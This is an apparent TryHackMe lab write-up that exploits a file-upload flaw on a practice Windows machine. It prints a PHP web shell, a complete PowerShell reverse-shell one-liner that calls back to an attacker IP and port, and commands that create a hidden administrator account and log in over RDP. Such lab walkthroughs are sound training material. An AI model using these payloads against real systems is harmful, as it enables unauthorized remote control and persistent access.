Now lets start the machine form the **TASK 15** and see what is has to offer to use..

**NOTE: As this is a THM task so there wont be any firewall blocking in real life scenarios it wont be this easy for sure!!**
# USING SIMPLE PHP SCRIPT

![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/47f2952e-a5fc-47e0-9c2c-2c2e9ec3453c)

The website look something like this..

Now lets create a simple PHP script and upload it on the website

    <?php echo "<pre>" .shell_exec($_GET["cmd"]). "</pre>"; ?>

Now lets visit the /upload/fname (in my case fname = revshell.php)
![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/b5b4ec5d-5990-4f52-ba61-ef9c7852f563)

Open the listern on any port that you desire..


Now lets look at this git repo: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell

From here we will be using the powershell one liner script in order to get a rev shell


    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.17.61.124',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Chnage the ip address and port accordingly..

Now convert this in url form and then modify the url 

    http://10.10.109.254/uploads/revshell.php?cmd=<whole script that has been converted into url using any url encoder>

![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/77dfb4b7-ebf0-4fe2-9459-cbdc35320d8d)

There we goo!! 

Now read the Questions of TASK 13 

**The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.**

Lets do this simple commands:


        net user <uname> <password> /add

Now lets add the user in the administrator group:

        net localgrouup administrators <uname> /add

After completing this proccess lets try to access it using the xfreerdp the command for that will look like this:

        xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.109.254 /u:abc /p:'abc123'

![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/2ca970b9-bf12-4576-bb96-0317f8bba194)


Cool we are connected now!!
